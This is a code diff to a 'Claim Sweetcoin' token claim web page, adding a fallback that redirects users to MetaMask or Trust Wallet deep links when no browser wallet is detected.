@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Claim Sweetcoin</title>
-  <link rel="stylesheet" href="style.css" />
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <style>
     body { font-family: sans-serif; }
@@ -40,6 +39,7 @@
   </style>
 </head>
 <body>
+
 <header>
   <nav>
     <ul>
@@ -96,6 +96,21 @@
     }, 1000);
   }
 
+  function openInWalletApp() {
+    const domain = window.location.hostname;
+    const dappUrl = `https://${domain}/claim.html`;
+
+    // 跳转 MetaMask
+    const metamaskUrl = `https://metamask.app.link/dapp/${domain}/claim.html`;
+    window.location.href = metamaskUrl;
+
+    // 等待 2 秒再跳 Trust Wallet（作为备选）
+    setTimeout(() => {
+      const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
+      window.location.href = trustUrl;
+    }, 2000);
+  }
+
   async function handleAction() {
     const button = document.getElementById("actionButton");
     const status = document.getElementById("statusMessage");
@@ -103,6 +118,12 @@
     if (actionLocked) return;
     actionLocked = true;
     button.disabled = true;
+
+    if (typeof window.ethereum === "undefined" || typeof window.ethereum.request !== "function") {
+      status.textContent = "No wallet detected. Trying to open wallet app...";
+      openInWalletApp();
+      return;
+    }
 
     try {
       if (!walletConnected) {
